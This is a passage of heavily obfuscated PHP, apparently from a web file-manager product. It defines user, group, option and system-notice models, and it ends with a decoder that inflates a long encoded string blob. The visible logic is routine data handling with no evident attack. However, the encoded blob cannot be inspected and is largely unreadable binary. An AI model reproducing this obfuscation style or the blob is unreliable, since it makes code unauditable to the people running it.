$this->_searchFromMeta($˜ö¡‰Åõ[547], $…ğ¾‘‡, 10); $¤¾ÎÚõö = array_merge($ùŠ·öº…, $÷†óÂ–¦, $Ÿšş–¯[$˜ö¡‰Åõ[454]]); $Ÿšş–¯[$˜ö¡‰Åõ[454]] = array_unique_by_key($¤¾ÎÚõö, $˜ö¡‰Åõ[1773]); $Ÿšş–¯[$˜ö¡‰Åõ[451]][$˜ö¡‰Åõ[452]] = count($Ÿšş–¯[$˜ö¡‰Åõ[454]]); $Ÿšş–¯[$˜ö¡‰Åõ[451]][$˜ö¡‰Åõ[453]] = ceil($Ÿšş–¯[$˜ö¡‰Åõ[451]][$˜ö¡‰Åõ[452]] / $Ÿšş–¯[$˜ö¡‰Åõ[451]][$˜ö¡‰Åõ[448]]); } $this->_listDataApply($Ÿšş–¯[$˜ö¡‰Åõ[454]]); $this->_filterByGroup($Ÿšş–¯, $ø®¡Ø¯ˆ); return $Ÿšş–¯; } private function _filterByGroup(&$ŞİÊ‘Èú, $¦ş–Ó–Ï) { $ÂçœŸ¤  =& $_SERVER[ÕŸ²ó÷å]; if (!$¦ş–Ó–Ï) { return $ŞİÊ‘Èú; } foreach ($ŞİÊ‘Èú[$ÂçœŸ¤ [454]] as $¡˜æòø¨ => &$ëìó ä ) { $ôÂ¤æÑõ = array_to_keyvalue($ëìó ä [$ÂçœŸ¤ [2163]], $ÂçœŸ¤ [12], $ÂçœŸ¤ [1972]); if (!in_array($¦ş–Ó–Ï, $ôÂ¤æÑõ)) { unset($ŞİÊ‘Èú[$ÂçœŸ¤ [454]][$¡˜æòø¨]); } } unset($ëìó ä ); $ŞİÊ‘Èú[$ÂçœŸ¤ [454]] = array_values($ŞİÊ‘Èú[$ÂçœŸ¤ [454]]); $ŞİÊ‘Èú[$ÂçœŸ¤ [451]] = array($ÂçœŸ¤ [2230] => count($ŞİÊ‘Èú[$ÂçœŸ¤ [454]]), $ÂçœŸ¤ [2228] => $ŞİÊ‘Èú[$ÂçœŸ¤ [451]][$ÂçœŸ¤ [448]], $ÂçœŸ¤ [2227] => 1, $ÂçœŸ¤ [2229] => 1); } private function _searchFromMeta($©äÂÜÍ, $ö»’Ç„, $¾ÕÁ”) { $ÊÉÇºÃ =& $_SERVER[ÕŸ²ó÷å]; $ö»’Ç„ = strtolower($ö»’Ç„); $ââÔ’íœ = array($ÊÉÇºÃ[107] => $©äÂÜÍ, $ÊÉÇºÃ[459] => array($ÊÉÇºÃ[468], "\x25{$ö»’Ç„}\x25")); $ââÔ’íœ = $this->parseWhereLike($ââÔ’íœ); $¡„¥Á…Ò = Model($ÊÉÇºÃ[2498])->where($ââÔ’íœ)->limit($¾ÕÁ”)->select(); if (!$¡„¥Á…Ò) { return array(); } $¡„¥Á…Ò = array_to_keyvalue($¡„¥Á…Ò, $ÊÉÇºÃ[12], $ÊÉÇºÃ[1773]); $†»ÄÀ‹ = $this->where(array($ÊÉÇºÃ[1764] => array($ÊÉÇºÃ[7], $¡„¥Á…Ò)))->select(); if (!$†»ÄÀ‹) { return array(); } return $†»ÄÀ‹; } private function _listDataApplyItem($»¼Ë™˜) { $É¯è·µ¡ = array($»¼Ë™˜); $this->_listDataApply($É¯è·µ¡); return $É¯è·µ¡[0]; } private function _listDataApply(&$«ûá‘‘Œ) { $ˆ¤Ëù´ì =& $_SERVER[ÕŸ²ó÷å]; if (!$«ûá‘‘Œ) { return; } array_remove_key($«ûá‘‘Œ, $ˆ¤Ëù´ì[970]); $Šœä™  = array_to_keyvalue($«ûá‘‘Œ, $ˆ¤Ëù´ì[12], $ˆ¤Ëù´ì[1773]); $this->_listAppendGroup($«ûá‘‘Œ, $Šœä™ ); $this->_listAppendMeta($«ûá‘‘Œ, $Šœä™ ); $this->_listAppendSourceRoot($«ûá‘‘Œ, $Šœä™ ); } private function _listAppendSourceRoot(&$ËÛ‹Ùœ, $§×Ò×¦ø) { $Ã„ø—Ú  =& $_SERVER[ÕŸ²ó÷å]; $÷Ä´±Éš = Model($Ã„ø—Ú [908])->listSourceRoot(SourceModel::TYPE_USER, $§×Ò×¦ø); $÷Ä´±Éš = array_to_keyvalue($÷Ä´±Éš, $Ã„ø—Ú [578]); $÷Ä´±Éš = array_remove_key($÷Ä´±Éš, $Ã„ø—Ú [578]); foreach ($ËÛ‹Ùœ as &$–Úı·óÑ) { $–Úı·óÑ[$Ã„ø—Ú [100]] = $÷Ä´±Éš[$–Úı·óÑ[$Ã„ø—Ú [1773]]] ? $÷Ä´±Éš[$–Úı·óÑ[$Ã„ø—Ú [1773]]] : array(); } unset($–Úı·óÑ); } private function _listAppendGroup(&$³“ğ¦şœ, $œÀùêß¬) { $¢«¡ÕªÇ =& $_SERVER[ÕŸ²ó÷å]; $šƒ„Ò²ú = array($¢«¡ÕªÇ[1773] => array($¢«¡ÕªÇ[7], $œÀùêß¬)); $÷¦øƒÚ¤ = Model($¢«¡ÕªÇ[2066])->where($šƒ„Ò²ú)->select(); $ß¼ó±Ø¤ = array_to_keyvalue($÷¦øƒÚ¤, $¢«¡ÕªÇ[12], $¢«¡ÕªÇ[1972]); $ß¼ó±Ø¤ = array_remove_value(array_unique($ß¼ó±Ø¤), $¢«¡ÕªÇ[238]); if (!$ß¼ó±Ø¤ || !$÷¦øƒÚ¤) { return; } $šƒ„Ò²ú = array($¢«¡ÕªÇ[1972] => array($¢«¡ÕªÇ[7], $ß¼ó±Ø¤)); $¹üÄÒ°ª = Model($¢«¡ÕªÇ[2161])->field($¢«¡ÕªÇ[2499])->where($šƒ„Ò²ú)->select(); $¹üÄÒ°ª = array_to_keyvalue($¹üÄÒ°ª, $¢«¡ÕªÇ[1972]); $÷¦øƒÚ¤ = array_to_keyvalue_group($÷¦øƒÚ¤, $¢«¡ÕªÇ[1773]); foreach ($÷¦øƒÚ¤ as &$ÕõÖßÛÎ) { $¨ÛËÄ¶Õ = array(); foreach ($ÕõÖßÛÎ as $Æ¼€ù¸) { if (!$Æ¼€ù¸[$¢«¡ÕªÇ[2080]]) { continue; } $ÙÌú‰« = Model($¢«¡ÕªÇ[580])->listData($Æ¼€ù¸[$¢«¡ÕªÇ[2080]]); $¨ÛËÄ¶Õ[] = array($¢«¡ÕªÇ[1972] => $Æ¼€ù¸[$¢«¡ÕªÇ[1972]], $¢«¡ÕªÇ[2500] => $¹üÄÒ°ª[$Æ¼€ù¸[$¢«¡ÕªÇ[1972]]][$¢«¡ÕªÇ[32]], $¢«¡ÕªÇ[593] => $¹üÄÒ°ª[$Æ¼€ù¸[$¢«¡ÕªÇ[1972]]][$¢«¡ÕªÇ[593]], $¢«¡ÕªÇ[496] => $ÙÌú‰«); } $ÕõÖßÛÎ = $¨ÛËÄ¶Õ; } unset($ÕõÖßÛÎ); foreach ($³“ğ¦şœ as &$¯ìø€’) { $¯ìø€’[$¢«¡ÕªÇ[2163]] = array(); if (isset($÷¦øƒÚ¤[$¯ìø€’[$¢«¡ÕªÇ[1773]]])) { $¯ìø€’[$¢«¡ÕªÇ[2163]] = $÷¦øƒÚ¤[$¯ìø€’[$¢«¡ÕªÇ[1773]]]; } } unset($¯ìø€’); } public function userAppendGroup($½‹“×ğÎ) { $ƒ½Ùåú³ =& $_SERVER[ÕŸ²ó÷å]; if (!$½‹“×ğÎ) { return array(); } $this->_listAppendGroup($½‹“×ğÎ, array_to_keyvalue($½‹“×ğÎ, $ƒ½Ùåú³[12], $ƒ½Ùåú³[1773])); return $½‹“×ğÎ; } private function _listAppendMeta(&$¾¹ Ûó‘, $“ƒ‰Ù¡­) { $†áÑí× =& $_SERVER[ÕŸ²ó÷å]; $ ¥°ÄÅ• = UserJobModel::JOB_KEY; $ò¿í÷„Å = array($†áÑí×[2480]); $Ú’€îäú = array($†áÑí×[1773] => array($†áÑí×[7], $“ƒ‰Ù¡­)); $¼»úŒŞò = Model($†áÑí×[2478])->where($Ú’€îäú)->select(); $¼»úŒŞò = array_to_keyvalue_group($¼»úŒŞò, $†áÑí×[1773]); foreach ($¼»úŒŞò as &$Å“¡©Ú¢) { $±î‘¸óÜ = array(); foreach ($Å“¡©Ú¢ as $¸ÅÆâ²ã) { if (!in_array($¸ÅÆâ²ã[$†áÑí×[107]], $ò¿í÷„Å)) { $±î‘¸óÜ[$¸ÅÆâ²ã[$†áÑí×[107]]] = $¸ÅÆâ²ã[$†áÑí×[459]]; } } $Å“¡©Ú¢ = $±î‘¸óÜ; } unset($Å“¡©Ú¢); $±›ğú×ş = Model($†áÑí×[2501]); foreach ($¾¹ Ûó‘ as &$Ò²Ñ™) { $ò÷‚‰¦Û = array(); if (isset($¼»úŒŞò[$Ò²Ñ™[$†áÑí×[1773]]])) { $ò÷‚‰¦Û = $¼»úŒŞò[$Ò²Ñ™[$†áÑí×[1773]]]; } $Ò²Ñ™[$†áÑí×[2502]] = array(); if (isset($ò÷‚‰¦Û[$ ¥°ÄÅ•])) { $Ò²Ñ™[$†áÑí×[2502]] = $±›ğú×ş->getUserJobInfo($ò÷‚‰¦Û[$ ¥°ÄÅ•]); } } unset($Ò²Ñ™); } protected function groupUserAll($ì¬ã´‡¥) { $—Œ¯ªº¦ =& $_SERVER[ÕŸ²ó÷å]; if (!$ì¬ã´‡¥) { return !1; } $€‹ëè• = Model($—Œ¯ªº¦[2066])->field($—Œ¯ªº¦[1773])->where(array($—Œ¯ªº¦[1972] => array($—Œ¯ªº¦[7], $ì¬ã´‡¥)))->select(); $€‹ëè• = array_to_keyvalue($€‹ëè•, $—Œ¯ªº¦[12], $—Œ¯ªº¦[1773]); return array_unique($€‹ëè•); } public function userSearch($Úı†Û“í, $ßéÈâ¤Ù = "\52") { return Model($_SERVER[ÕŸ²ó÷å][607])->where($Úı†Û“í)->field($ßéÈâ¤Ù)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\145\x72\137\x6f\160\164\151\x6f\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($×ß×Ë‰Ã) { $¼òÀ®‰Ç =& $_SERVER[ÕŸ²ó÷å]; $®í»’Ğ‘ = defined($¼òÀ®‰Ç[2198]) && USER_ID ? USER_ID : $¼òÀ®‰Ç[12]; return "\x55\x73\145\162\117\160\x74\x69\x6f\x6e\137{$×ß×Ë‰Ã}\137" . $®í»’Ğ‘; } protected function filterWhere($‚’ú„ˆ») { $½œÉËà« =& $_SERVER[ÕŸ²ó÷å]; $‚’ú„ˆ»[$½œÉËà«[1773]] = defined($½œÉËà«[2198]) && USER_ID ? USER_ID : $½œÉËà«[12]; return $‚’ú„ˆ»; } public function cacheRemoveUser($‹Æ¦€‚ì, $ù¨ÒÏŸà) { return Cache::remove("\125\x73\x65\x72\x4f\x70\x74\151\x6f\156\137{$‹Æ¦€‚ì}\137" . $ù¨ÒÏŸà); } protected function optionDefault($’¸şÂÆ© = '') { $òÁ…Ï‡ =& $_SERVER[ÕŸ²ó÷å]; if ($’¸şÂÆ© == $òÁ…Ï‡[12]) { return $GLOBALS[$òÁ…Ï‡[6]][$òÁ…Ï‡[2503]]; } if ($’¸şÂÆ© == $òÁ…Ï‡[2504]) { return $GLOBALS[$òÁ…Ï‡[6]][$òÁ…Ï‡[2505]]; } } } goto Cø½¨ŸŒ Å; EËò—¸‘é: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\x6e\157\164\151\143\x65\x4c\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\143\157\x6e\x74\x65\x6e\164", "\141\x75\164\150", "\155\x6f\144\x65", "\x74\151\x6d\x65", "\164\171\160\145", "\x6c\145\166\x65\x6c", "\x65\156\x61\x62\154\145", "\x73\x6f\x72\x74"); public function listData($Ä‚ƒØë¿ = false, $¶áì³“€ = "\163\x6f\162\x74", $îıÃ„ş· = false) { return parent::listData($Ä‚ƒØë¿, $¶áì³“€, $îıÃ„ş·); } public function add($·ßÍèÂ) { $èËÊµœ÷ =& $_SERVER[ÕŸ²ó÷å]; $ÎªãöÚ“ = time(); if ($·ßÍèÂ[$èËÊµœ÷[16]] == $èËÊµœ÷[2439]) { $ÎªãöÚ“ = strtotime($·ßÍèÂ[$èËÊµœ÷[216]]); } $·ßÍèÂ[$èËÊµœ÷[216]] = $ÎªãöÚ“; return parent::insert($·ßÍèÂ); } public function update($ÎÖµö²Ş, $ŸŞø¾À¯) { $•ŞÖğˆˆ =& $_SERVER[ÕŸ²ó÷å]; $Ü‚íÂ©• = $this->listData($ÎÖµö²Ş); if (!$Ü‚íÂ©•) { return !1; } $¥•¦ñ÷… = time(); if ($ŸŞø¾À¯[$•ŞÖğˆˆ[16]] == $•ŞÖğˆˆ[2439]) { $¥•¦ñ÷… = strtotime($ŸŞø¾À¯[$•ŞÖğˆˆ[216]]); } $ŸŞø¾À¯[$•ŞÖğˆˆ[216]] = $¥•¦ñ÷…; return parent::update($ÎÖµö²Ş, $ŸŞø¾À¯); } public function remove($Ù·ÓÉÊ®) { $æ‰ÀûÄÁ = $this->listData($Ù·ÓÉÊ®); if (!$æ‰ÀûÄÁ || $æ‰ÀûÄÁ[$_SERVER[ÕŸ²ó÷å][201]]) { return !1; } return parent::remove($Ù·ÓÉÊ®); } public function sort($‹«üØèı, $á†«¼‚Ò) { return parent::update($‹«üØèı, $á†«¼‚Ò); } public function enable($‚©””ë, $ãøÌûë) { return parent::update($‚©””ë, array($_SERVER[ÕŸ²ó÷å][2440] => $ãøÌûë)); } private function initUserOption() { $—Èı°Ï =& $_SERVER[ÕŸ²ó÷å]; $this->optionType = $—Èı°Ï[2441]; $this->modelType = $—Èı°Ï[2442]; $this->field = array($—Èı°Ï[2443], $—Èı°Ï[32], $—Èı°Ï[216], $—Èı°Ï[33], $—Èı°Ï[2444], $—Èı°Ï[834], $—Èı°Ï[236]); } public function userNoticeGet($¾Õ£Îğ¬ = false) { $this->initUserOption(); return parent::listData($¾Õ£Îğ¬, $_SERVER[ÕŸ²ó÷å][484], !0); } public function userNoticeAdd($¦¥€Äºå) { $€ÙŸ„ÜÒ =& $_SERVER[ÕŸ²ó÷å]; $this->initUserOption(); $÷ºëô› = $this->findByKey($€ÙŸ„ÜÒ[2443], $¦¥€Äºå[$€ÙŸ„ÜÒ[484]]); if ($÷ºëô›) { return !0; } $Ï¶ºØÑ = array($€ÙŸ„ÜÒ[2443] => $¦¥€Äºå[$€ÙŸ„ÜÒ[484]], $€ÙŸ„ÜÒ[32] => $¦¥€Äºå[$€ÙŸ„ÜÒ[32]], $€ÙŸ„ÜÒ[216] => $¦¥€Äºå[$€ÙŸ„ÜÒ[216]], $€ÙŸ„ÜÒ[33] => isset($¦¥€Äºå[$€ÙŸ„ÜÒ[33]]) ? $¦¥€Äºå[$€ÙŸ„ÜÒ[33]] : 1, $€ÙŸ„ÜÒ[2444] => isset($¦¥€Äºå[$€ÙŸ„ÜÒ[2444]]) ? $¦¥€Äºå[$€ÙŸ„ÜÒ[2444]] : 0, $€ÙŸ„ÜÒ[834] => 0, $€ÙŸ„ÜÒ[236] => 0); return parent::insert($Ï¶ºØÑ); } public function userNoticeEdit($ª‘ğõ·Ş, $÷Ñ×ÁÒ) { $this->initUserOption(); return parent::update($ª‘ğõ·Ş, $÷Ñ×ÁÒ); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\155\x5f\x6f\160\164\x69\157\x6e"; protected $jsonField = array("\x6d\145\x6e\x75", "\x72\x6f\154\145", "\162\157\154\x65\107\x72\157\165\x70", "\162\x65\147\x69\163\164", "\x65\155\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($‹Ë¯·ÇÎ) { return "\x53\171\x73\x74\x65\155\117\160\x74\x69\x6f\156\x5f{$‹Ë¯·ÇÎ}"; } protected function optionDefault($Ä„±û´ = '') { $•†¹Åôö =& $_SERVER[ÕŸ²ó÷å]; if ($Ä„±û´ == $•†¹Åôö[12]) { return $GLOBALS[$•†¹Åôö[6]][$•†¹Åôö[466]]; } } } class SystemRecordModel extends ModelBaseLight { } goto a½ˆÙ‰Í×£; bĞµ–«ÚìÁ: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\xd5\x9f\xb2\xf3\xf7\xe5", base64_decode('t6Gwv4r7')); $_SERVER[ÕŸ²ó÷å] = explode("\174\2\174\3\174\5", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xb5\x30\x3b\x9\xdb\x6b\x4b\x29\x6d\x81\xc7\xe0\x90\xd8\x4e\xb4\xd8\xce\xee\xc4\x49\x64\x59\xb6\x45\x64\xcb\x91\xe4\x2c\xd8\x66\x32\x92\xc6\xb2".base64_decode('YkmjaEbekrBvhYQAYSdsD9qG8kJC2cISKGVtQ9PQQtneY42dQFm6QFu29r/LucuMZHj/9w==')."\376\357\373\363\45\321\335\347\56\347\236\163\356\271\347\236\263\347\302\213\316\375\350\274\265\7\255\75\170\355\241\233\37\270\343\77\77\175\222\206\327\36\202\176\17\243\341\223\57\235\160\0".base64_decode('+XPspZdUVbXOOmJa+1Eb79uq3an9TLs0HNr1fPDo3f95WmDs9l3DYwce4H5h5nX1qDCtWw==').strrev('Ú51ÃÛWË4™ÕÍÿ‘~…Gô=F,5‚¡#:K×ôs§'."\r".'é½r0šL´ÚPú)aœ”O')."\331\321\21\210\304\240\120\275\234\237\65\222\20\312\153\5\55\13\337\317\353\5\23\365\106\156\116\315\33\171\75\147\113\21\11\111\315\322\342\232\11\55\65\65\252\115\201\216\120\170\205\32"."\133\321\21\200\22\161\165\165\121\57\14\323\30\11\106\55\255\140\305\322\131\235\227\30\54\360\176\65\6\132\202\355\112\54\342\153\217\372\374\261\140\270\235\46\373\303\155\155\301\130\151\172"."\x24\x1c\xa\x35\xfa\xfc\x8b\x4b\x73\x3a\x22\xbe\x96\x36\x9f\x82\xfa\x97\xd1\xd5\x74\xae\xd7\xa8\x52\x56\xd2\x9c\x95\x4a\x35\xd\x34\xa7\xf5\x4c\x92\x6\x73\x1a\xeb\x8e\x35\x9c\x87\x50\x8c\x87\xd0\x32\xe5\x8a"."\231\14\215\264\363\120\122\357\325\212\31\230\255\46\71\222\57\244\263\32\33\364\142\175\230\247\322\200\126\264\214\164\56\101\43\201\41\253\240\211\164\324\327\4\132\150\75\7\115\105\3\241"."\x80\x3f\xa6\xe0\xe\x2a\xcd\x91\x70\x9b\x2\x8b\x90\xd5\x4c\x4b\x2f\x28\xcb\x5a\x3\x91\x80\x82\x3b\xdd\x50\x49\xc6\x5a\xa9\x0\xbc\xb4\xa3\xa9\x50\x7c\xa1\x90\x32\x5e\xb\x96\x9e\xcd\xb3\x66\x68\x9d\x32\x8d"."\205\43\115\201\210\322\270\102\21\63\224\60\262\131\43\347\101\255\240\225\264\244\256\6\42\21\32\160\1\170\207\202\170\321\40\22\156\156\216\6\170\14\240\124\353\115\147\364\150\172\104\17"."\346\234\51\64\216\143\152\112\267\124\264\65\54\364\45\0\324\106\137\64\350\127\73\174\261\126\230\271\174\336\153\46\373\115\257\126\110\364\245\7\364\120\72\356\215\247\163\136\14\240\236\70"."\333\112\107\320\237\31\60\216\76\75\321\257\152\161\243\140\351\0\6\305\134\46\235\353\227\173\2\213\260\44\204\146\154\72\354\43\133\54\331\233\261\324\1\55\123\144\333\11\252\127\302\17".strrev('8ıAç@Xl®š4b­JÎ-!Åê}QdIè¥iYoƒ&‚vÂ.—:u|ô&ü')."\236\312\1\275\140\251\172\56\141\44\323\71\300\67\13\141\337\150\126\137\123\1\115\141\1\26\300\310\44\131\330\264\55\113\173\61\53\27\341\121\264\0\231\144\201\241\210\257\53\111\243\41"."\216\161\160\131\21\313\243\236\160\144\225\356\35\26\50\3\227\353\340\271\246\121\54\44\20\0\365\302\264\324\102\262\156\131\150\160\154\102\214\316\174\306\320\222\121\275\300\207\226\66\232\121"."\x43\xe1\xa2\x25\x27\x16\x49\xb1\x66\xa3\x90\x6d\x42\xb0\x3\xdf\x47\x1b\x3b\xdd\x59\x26\xa3\x9f\x6d\xed\xa4\x34\x63\xde\xaa\xae\x73\xdc\xff\xec\xe9\x5a\x84\xfe\xab\x6\xec\xdd\xd\x7d\xea\xd3\x33\x19\x55\x1f".base64_decode('0mHvZ5MzTTYZXhMDLEqh0WBY7dPMvrbkTJXUYkQhqQ958n15QEwcF3Xb9iaeunbDCkikJQ==')."\x63\x24\xb4\x8c\x3c\x44\x1a\xee\xb3\xac\x7c\x54\xcf\x25\x9b\x39\xac\x27\x8d\xc1\x1c\x99\xa9\xbc\xce\xb6\x45\x93\x4b\x49\x2a\x6d\xca\xa\xa5\xb5\x3e\x5d\x6f\xb2\x8a\xd9\xc\xf\xb1\xd1\xf1\x34\x93\x27\x5a\x43"."\x6c\x39\x93\xbd\x0\xad\x6c\x3b\x56\xc0\x7\xd3\x26\x41\xd2\x2\xc3\xa0\xdd\x9c\x49\x27\x34\x2b\x6d\xe4\xbc\x46\xc2\xd2\x2d\xb7\x69\x15\x74\xd\x5a\xf4\x25\x12\xba\x69\xba\xfd\x8\x21\x14\x8c\x8c\xdb\x97\xc9"."\x18\x83\xee\x70\x21\x9d\x4a\xe7\xea\x95\xa9\x40\x2f\x28\xb6\x70\x63\x1c\x5e\xf\xc8\xa6\x62\x9e\x82\x1\x7\x7f\x66\x6a\x43\xd1\xea\x75\xcf\x61\x9b\x93\x97\x2e\x68\x39\xb3\x57\x2f\xb8\x3\xb0\x33\xea\x15\xd4".base64_decode('WY7IWbGmtJk3zDTuXr2iWZaW6MNIUDTf8DXl0xjF6KVlUSO6u6OgpbJavZIvxtEEwIaEtA==')."\x4\x2e\x21\x17\x86\x9\xa8\x57\xb2\xda\x90\x5b\x4b\xb1\x96\x2\x43\xf9\x74\x41\x37\xd9\xa8\x95\x96\xb6\x18\x40\x54\xaf\xbb\xd\x6f\xa4\xb4\x9e\x74\x47\x11\x95\x81\xc6\xa6\xd7\xcc\x50\x10\xac\x28\x2c\x8f\xa6".base64_decode('tsZiHWqwGbER7QG1zRfzA6INWFqKNR1CtIM3yRKXu9GGwtDUjgYnEjuMQb2APtw4XK/0Gw==')."\311\270\61\344\141\131\315\200\360\131\141\274\276\171\313\35\321\162\51\74\214\370\260\245\233\116\334\324\210\230\16\117\57\335\275\236\270\336\153\24\140\64\346\100\312\76\371\41\75\227\262\372".strrev('‚…åˆ›ÅË8ş7Ü¿³–¬XLI¢ODwëø7¬C99(ğ¾e±ÍÃF¢ id@ÑÛX')."\55\170\356\232\334\46\52\344\226\113\261\266\103\351\154\32\17\317\342\71\144\262\21\3\323\2\35\362\222\61\67\164\233\123\253\272\223\323\252\335\350\377\251\325\135\335\115\236\251\75\13\275"."\x69\x51\xc7\x5b\xeb\xa9\x55\xea\x6a\x66\x29\x1d\x88\xa3\x4a\x6b\x19\x5\x6\x5d\x52\xa2\x46\x9\x2f\xb6\x4f\x8b\x80\xf0\x9c\x91\xd3\xcb\x6e\x2c\x4\x48\x86\xa9\xbb\x5b\x75\xd\x21\x69\xb4\x10\xb6\x75\x71\xb1"."\x6f\xd1\xf8\xd7\xcc\x2e\xa6\x95\x12\x2e\x71\xac\xb\x4d\x8c\x4\x96\x74\x6\xa2\x31\xb5\x2d\x10\x6b\xd\x37\x41\xf7\x3\x3e\x8\xe5\x50\x65\xd2\x5f\xb6\xc6\x98\x81\x4\xb2\x98\x83\x66\xf5\x21\x89\x86\x8\x5a"."\220\220\47\204\324\153\67\6\31\366\167\0\220\37\363\3\343\344\241\20\214\306\240\170\211\55\135\27\375\351\1\150\356\1\336\41\155\66\113\164\23\107\71\176\125\215\370\52\4\131\155\72"."\x23\x22\xf0\xa5\x60\x16\xed\x61\xd1\x73\xd5\x4e\xe4\xd8\xb0\xda\x4\xa4\xa3\x2d\xb3\x2c\x9d\xe4\x54\x10\x45\x5b\xf5\x74\xaa\xf\x3a\x9a\xc6\xcd\x25\x8c\x8c\x51\xd0\x32\x18\xf7\x33\x6\x3b\x95\x6\x34\x9c\xcf"."\24\21\334\173\161\303\261\276\142\66\16\224\12\315\21\142\267\4\357\153\16\43\6\61\313\50\62\42\353\126\260\311\106\167\41\346\125\61\254\166\173\362\271\124\365\251\320\226\132\67\263\6"."\47\300\62\302\310\320\41\240\250\227\16\335\223\60\320\306\156\323\372\365\172\74\26\300\146\363\110\52\213\110\10\163\36\246\161\15\116\274\200\227\47\343\311\242\106\110\233\176\203\123\145\172"."\314\232\147\247\161\212\136\50\30\205\123\240\4\11\53\204\120\342\345\202\306\55\316\166\230\10\5\260\160\237\301\331\24\203\1\143\275\27\306\75\271\256\31\320\106\22\261\153\36\323\102\213"."\200\6\250\45\223\345\222\21\252\201\6\326\62\70\45\31\214\17\360\106\247\243\277\202\350\47\215\254\306\110\50\41\176\172\222\122\77\133\22\335\266\64\151\52\153\267\140\31\70\263\140\53"."\x89\x20\xb1\xcf\x80\x9e\xa1\xa5\x87\x51\x15\xf9\xf0\xd8\x40\x93\x7a\x46\x67\x50\xd4\xa7\x33\x6\xa2\x6\x8a\xa1\xe9\xe7\x30\x26\x18\x67\x74\x94\x41\xa9\x82\x73\x4b\x9b\x11\x54\x13\x93\x7b\x16\x5f\x86\xcf\x7e"."\42\1\363\74\0\74\42\230\101\113\27\46\273\106\304\73\12\172\157\172\210\41\210\41\253\115\53\364\263\201\241\232\142\277\341\210\264\27\233\73\103\41\325\37\156\217\241\243\43\115\131\26".strrev('*`ˆ'."\0".'•’Y`âÜ‚€ŸÂçˆ@pW„ê	À@Êh,fL¶q³b¿ŸTšùÆ	')."\x1c\x7c\x2\xa2\xf4\xd9\x11\x77\x16\x21\xf\x37\xef\x93\x9d\x3d\x53\x80\xdc\x53\x2e\x2f\x8\xcb\x94\xe4\x8b\x83\x27\xf\x6d\x64\xc6\x17\x76\x84\xa3\x50\x61\x21\x4e\x45\xbc\x79\x9c\xef\xb7\x8e\x4e\xc8\xca\x4a"."\40\322\22\200\104\263\117\3\126\333\267\54\312\150\167\21\25\54\244\107\64\61\226\205\254\43\154\4\331\214\340\361\355\303\161\213\45\57\232\156\35\263\27\342\13\63\334\255\155\76\277\73"."\332\352\253\233\71\213\246\256\310\46\273\143\255\151\263\373\164\36\207\371\33\64\147\250\5\35\141\32\366\241\272\232\132\206\7\20\173\44\165\157\205\73\353\306\255\340\251\363\324\324\324\260".base64_decode('tqbNUvoQguNkJEmWhx24iol+tlO0BON5MXkx3YNphpJP5ceDU0vB5lQ7IYQmioQEq1oCfw==').base64_decode('TEUtWkVTnim0n5KoUpqx8jRVy6TQpFt9WTlRrDiN65Qv5GvHZxHPbTnazPY/4kRhGMvL9g==')."\x61\x79\xb9\x3e\x2c\x77\xf4\x61\x79\x69\x1f\x68\x92\x99\x4e\xe5\xd0\x28\x19\x55\x83\xe5\x68\xc1\xcb\x21\x2d\xab\x6d\x99\x87\x54\x54\x91\x9\x4\x54\x79\x28\x30\x49\x30\xc\x39\xa7\x95\xa3\x31\x36\xc8\xb6\xa6".base64_decode('mawfvrbT3U0+hgTmL0QgqgxgUZiRa6is9dRUKuyo3FDZGWtGB4eFC46Y7zeyeYwR2/DpEA==').strrev('#ƒârÌa€	=fZˆŞ9«-€kÇ{æåÊ÷Î*€Ó<hµ¾‘c)˜ù†R'."\0".'\\Bzï')._kodDe('K4IZTbjgdsh+Y6kTRvmXBM4JdkAe3+J2A8aKtg6vP5z1e5BOOP7dkPj2uHa+S8Rfpz0J/94=')."\x38\x72\x9a\x1a\xd5\x8e\x48\xa0\x39\xb8\x9c\x47\x9b\x83\x81\x50\x53\x54\xf5\xfb\xfc\xad\xa2\x4c\xbb\xaf\xd\x22\x88\x17\xd2\x33\x49\xd3\x6b\x2f\xaf\x22\x5e\x33\xca\xe5\x7d\x2a\x2c\x18\xc4\x6c\x22\x36\x95\x9".base64_decode('ZVSBhNG5RQcAhuFiiSkZico2fZFzjuyQnmVUFp25YEXYgaOK/lQrvqhi5VVOT+PDPEiGwQ==')."\xe2\x88\xcb\x80\xef\x2b\xc0\xf7\x96\xf4\x40\xc5\x65\x1a\xa5\xd3\x4d\xf9\x4\x5f\xaf\xc5\x39\x4d\x47\x1c\x51\xf\x91\x87\x56\xc0\x47\x44\xb3\x8\x12\xc8\x8a\xc0\x67\xd2\x88\x16\x15\x2c\x1f\xeb\x4e\xaf\x10\x8b"."\xaa\xe1\x8e\x40\xc4\x87\x85\xaa\xea\xb2\x48\xb8\xbd\x5\x2a\xc\xf6\xe9\xac\x3\x41\x98\xfe\x2a\x76\xdc\x4\xd9\xaa\x25\x48\xba\x96\x49\x6b\x4c\x78\x25\x26\x7d\x95\xc1\xa6\x72\xa\xe0\xd4\x34\xe7\xe5\x73\x6c"."\272\343\230\255\141\14\55\13\364\242\375\300\130\22\243\310\77\23\67\214\14\243\160\131\306\121\41\144\303\205\262\253\114\6\35\103\214\110\117\343\64\1\140\66\274\70\320\256\62\220\242\61"."\11\14\151\102\40\22\11\107\140\46\54\243\237\11\272\150\146\44\20\145\364\21\323\237\64\233\47\257\147\32\200\257\216\270\67\370\274\367\214\356\301\151\125\135\356\151\236\36\24\250\236\272"."\210\106\41\326\355\261\105\31\123\135\54\360\332\170\253\127\231\13\253\353\273\275\335\336\252\205\365\135\76\367\210\346\36\251\161\317\165\367\40\126\274\172\32\44\364\254\251\163\315\130\207\13".strrev('Î„º…VœšºÔ3íÄŠ$ï²«S=ƒİIİ)Ú~²§»«¨¹\\ÎSİ»“…î†Ÿ õ\'‚ 